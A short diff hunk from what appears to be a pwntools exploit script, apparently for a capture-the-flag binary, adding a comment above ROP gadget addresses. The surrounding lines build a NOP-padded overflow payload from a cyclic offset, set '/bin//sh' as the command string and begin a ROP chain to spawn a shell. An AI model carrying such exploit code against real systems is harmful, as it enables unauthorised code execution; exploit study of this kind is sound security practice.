@@ -74,6 +74,8 @@ payload = '\x90' * cyclic_find('laaa')
 command = '/bin//sh'
 
 DATA_START = 0x804a028
+
+## gadgets to write datas
 POP_EDI_POP_EBP = 0x080486da
 
 rop = ROP(exe)
